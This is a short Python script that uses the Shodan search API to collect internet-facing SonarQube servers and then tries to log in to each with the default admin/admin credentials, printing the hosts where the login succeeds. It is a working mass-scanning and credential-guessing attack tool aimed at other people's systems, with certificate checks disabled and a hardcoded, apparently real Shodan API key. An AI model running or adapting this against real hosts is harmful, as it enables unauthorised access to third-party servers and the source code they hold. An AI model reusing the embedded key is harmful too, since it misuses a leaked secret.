import shodan
import requests as rt 
import urllib3
SHODAN_API = "okdW2znkGhdiv5jW38Z0svbHuNMoaGpQ"
api = shodan.Shodan(SHODAN_API)
out_file = open('sonarqube-instances.txt','a')
query = 'http.title:"SonarQube"'
try:
    results = api.search(query)
    print(f"result found: {results['total']}")
    for result in results['matches']:
        print(f"IP: {result['ip_str']}",':',str(result['port']))
        if result['port'] in [80,443]:
            if result['port']==80:
                scheme = "http://"
            else:
                scheme = "https://"
            out = scheme+result['ip_str']
        else:
            out = "http://"+result['ip_str']+':'+str(result['port'])
        out_file.write(out+'\n')
        print('')
except shodan.APIError as e:
    print(f"error: {e}")


#same code but query only changed here to get a list of urls of sonarqube

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
urls = open("sonarqube-instances.txt","r")
data = {"login":"admin",
"password":"admin"
}
endpoint = "/api/authentication/login"
for url in urls.readlines():
    print("Testing- "+url)
    try:
        req = rt.post(url=url.rstrip("\n")+endpoint,data=data,verify=False)
        if req.status_code==200:
            print("Login Success")
    except:
        pass